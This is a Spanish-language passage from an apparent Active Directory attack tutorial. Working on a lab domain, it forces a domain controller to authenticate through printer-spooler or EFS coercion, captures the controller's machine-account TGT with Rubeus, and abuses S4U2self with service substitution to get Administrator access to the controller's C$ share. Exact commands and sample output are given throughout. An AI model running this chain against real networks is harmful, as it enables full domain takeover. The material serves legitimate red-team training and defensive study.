En la delegación sin restricciones dependíamos de que un usuario interesante (idealmente un admin de dominio) se autenticara contra el equipo que controlamos mientras monitorizábamos. En el mundo real eso no está garantizado. Este apartado resuelve ese problema: **forzar** a un equipo a autenticarse contra nosotros y luego tomar el control de cualquier máquina (incluido un DC) a partir de su TGT.

---

#### Forzar la autenticación (coerce)

Existen "activadores de autenticación remota" que obligan a un equipo a autenticarse contra otro. Dos clásicos:

- **SpoolSample** (Lee Christensen) — abusa del servicio de impresión `[MS-RPRN]`.
- **PetitPotam** (Topotam) — abusa de EFS `[MS-EFSRPC]`.

Primero monitorizamos tickets en el equipo que controlamos:

```
Rubeus.exe monitor /interval:5 /nowrap
```

Y forzamos al DC a autenticarse contra él con una herramienta de coerción (ejecutándola como usuario de dominio normal, integridad media):

```
SharpSpoolTrigger.exe dragon-dc server-ws
```

Rubeus captura entonces el TGT de la **cuenta de equipo** del DC:

```
[*] Found new TGT:
  User                  :  dragon-dc$@DRAGON.COM
  Base64EncodedTicket   :  doIFt[...recortado...]5DT00=
```

---

#### El problema: un TGT de equipo no da acceso a sí mismo

Si inyectas ese TGT e intentas acceder al `C$` del DC, falla con acceso denegado, porque **las cuentas de equipo no tienen admin local sobre sí mismas en remoto**:

```
ls \\dragon-dc\c$
[-] could not open \\dragon-dc\c$\*: 5 - ERROR_ACCESS_DENIED
```

#### La solución: S4U2self con sustitución de servicio

La técnica usa **S4U2self** para obtener un ticket de servicio utilizable suplantando a otro usuario. Se usa el parámetro `/self` del comando `s4u`:

```
Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/dragon-dc /ticket:doIFt[...recortado...]5DT00= /nowrap
```

- `/impersonateuser` → el usuario que queremos suplantar (Administrator).
- `/self` → le dice a Rubeus que **no** haga la petición S4U2proxy (no hay delegación restringida aquí).
- `/altservice` → el SPN que queremos meter en el ticket final (`cifs/dragon-dc`).
- `/ticket` → el TGT de la cuenta de equipo (el del DC).

Rubeus hace el S4U2self (obtiene un TGS de Administrator hacia el propio equipo) y luego **reemplaza el nombre de servicio** por el de `/altservice`:

```
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/dragon-dc'
[*] Got a TGS for 'Administrator' to 'cifs@DRAGON.COM'
[*] base64(ticket.kirbi):
      doIF/[...recortado...]kYy0x
```

Esto funciona porque el servicio CIFS corre bajo la cuenta de equipo (SYSTEM), así que la parte cifrada del ticket sigue siendo descifrable aunque el KDC no haya emitido explícitamente un TGS para ese SPN.

Inyectamos el ticket y ya tenemos acceso al `C$` del DC como Administrator:

```
klist
#0> Client: Administrator @ DRAGON.COM
    Server: cifs/dragon-dc @ DRAGON.COM

ls \\dragon-dc\c$
 [...listado del C$ del DC...]
```

El resultado: control total del DC partiendo solo de haberle forzado a autenticarse contra un equipo que controlábamos.
